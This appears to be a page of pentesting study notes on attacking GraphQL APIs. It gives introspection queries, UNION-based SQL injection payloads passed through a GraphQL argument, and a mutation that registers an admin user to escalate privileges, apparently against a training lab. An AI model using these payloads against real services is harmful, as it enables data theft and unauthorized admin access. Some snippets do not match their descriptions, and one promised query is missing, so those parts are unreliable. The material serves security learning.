# What is Graphql ?

For instance, we can identify all GraphQL types supported by the backend using the following query:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

```

The results contain basic default types, such as `Int` or `Boolean`, but also all custom types, such as `UserObject`:

<figure><img src="../../../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>

Now that we know a type, we can follow up and obtain the name of all of the type's fields with the following introspection query:

```graphql
{
  secrets {
    id
    secret
  }
}

```

<figure><img src="../../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

Furthermore, we can obtain all the queries supported by the backend using this query:

Knowing all supported queries helps us identify potential attack vectors that we can use to obtain sensitive information. Lastly, we can use the following "general" introspection query that dumps all information about types, fields, and queries supported by the backend:

```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description

          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description

      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

### **SQL Injection**

Find Number off columns

```jsx
{
  user(username: "x' ORDER BY 1-- -") {
    username
  }
}

```

As the GraphQL query only returns the first row, we will use the [GROUP\_CONCAT](https://mariadb.com/kb/en/group_concat/) function to exfiltrate multiple rows at a time. This enables us to exfiltrate all table names in the current database with the following payload:

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

Grep Data

```
{
  user(username: "x' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -") {
    username
  }
}
```

### **Mutations**

Let us start by identifying all mutations supported by the backend and their arguments. We will use the following introspection query:

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

From the result, we can identify a mutation registerUser, presumably allowing us to create new users. The mutation requires a RegisterUserInput object as an input:

<figure><img src="../../../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

We can now query all fields of the RegisterUserInput object with the following introspection query to obtain all fields that we can use in the mutation:

```graphql
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

From the result, we can identify that we can provide the new user's username, password, role, and msg:

<figure><img src="../../../.gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>

With the hashed password, we can now finally register a new user by running the mutation:

```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

The result contains the fields we queried in the mutation's body so that we can check for errors:

<figure><img src="../../../.gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>

### **Exploitation with Mutations**

To identify potential attack vectors through mutations, we need to thoroughly examine all supported mutations and their inputs. In this case, we can provide the `role` argument for newly registered users, which might enable us to create users with a different role than the default role, potentially allowing us to escalate privileges.

We have identified the roles `user` and `admin` from querying all existing users. Let us create a new user with the role `admin` and check if this enables us to access the internal admin endpoint at `/admin`. We can use the following GraphQL mutation:

```graphql
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

In the result, we can see that the role `admin` is reflected, which indicates that the attack was successful:

<figure><img src="../../../.gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>

Website :- [https://apis.guru/graphql-voyager/](https://apis.guru/graphql-voyager/)

After logging in, we can now access the admin endpoint, meaning we have successfully escalated our privileges:

{% file src="../../../.gitbook/assets/Attacking_Graphql_Module_Cheat_Sheet.pdf" %}
